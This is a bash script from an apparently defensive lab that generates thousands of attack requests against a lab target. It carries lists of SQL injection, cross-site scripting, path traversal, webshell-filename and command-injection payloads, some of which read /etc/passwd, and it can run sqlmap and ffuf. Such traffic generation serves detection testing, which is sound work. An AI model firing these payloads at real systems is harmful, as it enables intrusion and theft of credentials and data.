#!/usr/bin/env bash
set -euo pipefail

LAB_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")/.." && pwd)"
# shellcheck source=../lib.sh
source "${LAB_DIR}/lib.sh"

MODE="${1:-mixed}"
REQUESTS="${2:-3500}"

require_lab_target "$TARGET_IP"

SQL_PAYLOADS=(
  "' OR 1=1 --"
  "admin' #"
  "' UNION SELECT user,password FROM users--"
  "' OR 'a'='a"
  "1;SELECT pg_sleep(1)--"
  "' AND 1=CONVERT(int,@@version)--"
)
XSS_PAYLOADS=(
  "<script>alert(1)</script>"
  "\"><svg/onload=alert(1)>"
  "<img src=x onerror=alert(1)>"
  "<body onload=alert(document.domain)>"
  "javascript:alert(1)"
)
UPLOAD_PAYLOADS=(
  "../../../../etc/passwd"
  "..%2f..%2f..%2fetc%2fpasswd"
  "firmware.bin"
  "config_backup.tar"
  "shell.php"
  "image.jpg.php"
)
CMD_PAYLOADS=(
  ";id"
  "|whoami"
  "&& uname -a"
  "\$(cat /etc/passwd)"
)
PATHS=("/api/v1/telemetry" "/admin/config" "/device/update" "/login" "/search" "/upload" "/download" "/cgi-bin/status")
PARAMS=("id" "sensor" "mac" "query" "file" "username" "redirect" "cmd")
UAS=("sqlmap/1.7" "Mozilla/5.0" "curl/8.5.0" "python-requests/2.31.0" "ffuf/2.0")

urlencode() {
  python3 -c 'import sys, urllib.parse; print(urllib.parse.quote(sys.stdin.read().strip()))'
}

choose_payload() {
  case "$MODE" in
    sql|sql_injection|sqlmap) printf '%s\n' "${SQL_PAYLOADS[$RANDOM % ${#SQL_PAYLOADS[@]}]}" ;;
    xss) printf '%s\n' "${XSS_PAYLOADS[$RANDOM % ${#XSS_PAYLOADS[@]}]}" ;;
    uploading|upload|traversal) printf '%s\n' "${UPLOAD_PAYLOADS[$RANDOM % ${#UPLOAD_PAYLOADS[@]}]}" ;;
    command|cmd) printf '%s\n' "${CMD_PAYLOADS[$RANDOM % ${#CMD_PAYLOADS[@]}]}" ;;
    mixed|fuzz)
      case $((RANDOM % 4)) in
        0) printf '%s\n' "${SQL_PAYLOADS[$RANDOM % ${#SQL_PAYLOADS[@]}]}" ;;
        1) printf '%s\n' "${XSS_PAYLOADS[$RANDOM % ${#XSS_PAYLOADS[@]}]}" ;;
        2) printf '%s\n' "${UPLOAD_PAYLOADS[$RANDOM % ${#UPLOAD_PAYLOADS[@]}]}" ;;
        3) printf '%s\n' "${CMD_PAYLOADS[$RANDOM % ${#CMD_PAYLOADS[@]}]}" ;;
      esac
      ;;
    *)
      echo "Unknown mode: ${MODE}" >&2
      echo "Modes: sql, xss, uploading, traversal, command, fuzz, sqlmap, mixed" >&2
      exit 2
      ;;
  esac
}

run_sqlmap() {
  if command -v sqlmap >/dev/null 2>&1; then
    timeout 180 sqlmap -u "${TARGET_URL}/search?q=1" --batch --risk 2 --level 2 --threads 4 --flush-session || true
  fi
}

run_fuzzer() {
  local wordlist="/tmp/edge_injection_payloads.txt"
  {
    printf '%s\n' "${SQL_PAYLOADS[@]}"
    printf '%s\n' "${XSS_PAYLOADS[@]}"
    printf '%s\n' "${UPLOAD_PAYLOADS[@]}"
    printf '%s\n' "${CMD_PAYLOADS[@]}"
  } > "$wordlist"
  if command -v ffuf >/dev/null 2>&1; then
    timeout 180 ffuf -u "${TARGET_URL}/search?q=FUZZ" -w "$wordlist" -s || true
  elif command -v wfuzz >/dev/null 2>&1; then
    timeout 180 wfuzz -z "file,$wordlist" "${TARGET_URL}/search?q=FUZZ" || true
  fi
}

echo "Generating injection/${MODE}: ${REQUESTS} HTTP requests against ${TARGET_URL}"

if [[ "$MODE" == "sqlmap" ]]; then
  run_sqlmap
fi
if [[ "$MODE" == "fuzz" ]]; then
  run_fuzzer
fi

for ((i = 1; i <= REQUESTS; i++)); do
  payload="$(choose_payload)"
  encoded="$(printf '%s' "$payload" | urlencode)"
  path="${PATHS[$RANDOM % ${#PATHS[@]}]}"
  param="${PARAMS[$RANDOM % ${#PARAMS[@]}]}"
  ua="${UAS[$RANDOM % ${#UAS[@]}]}"

  case $((RANDOM % 5)) in
    0)
      curl -s -o /dev/null -A "$ua" --connect-timeout 2 -m 4 \
        "${TARGET_URL}${path}?${param}=${encoded}" || true
      ;;
    1)
      curl -s -o /dev/null -A "$ua" --connect-timeout 2 -m 4 \
        -X POST -d "${param}=${payload}" "${TARGET_URL}${path}" || true
      ;;
    2)
      curl -s -o /dev/null -A "$ua" --connect-timeout 2 -m 4 \
        -H "X-Forwarded-For: ${payload}" -H "Cookie: session_id=${encoded}" \
        "${TARGET_URL}${path}" || true
      ;;
    3)
      curl -s -o /dev/null -A "$ua" --connect-timeout 2 -m 4 \
        -F "file=@/etc/hosts;filename=${encoded}" "${TARGET_URL}/upload" || true
      ;;
    4)
      curl -s -o /dev/null -A "$ua" --connect-timeout 2 -m 4 \
        -H "Content-Type: application/json" \
        -d "{\"${param}\":\"${payload}\",\"id\":${RANDOM}}" "${TARGET_URL}${path}" || true
      ;;
  esac

  if (( i % 500 == 0 )); then
    echo "Progress: ${i}/${REQUESTS}"
  fi
  sleep 0.01
done
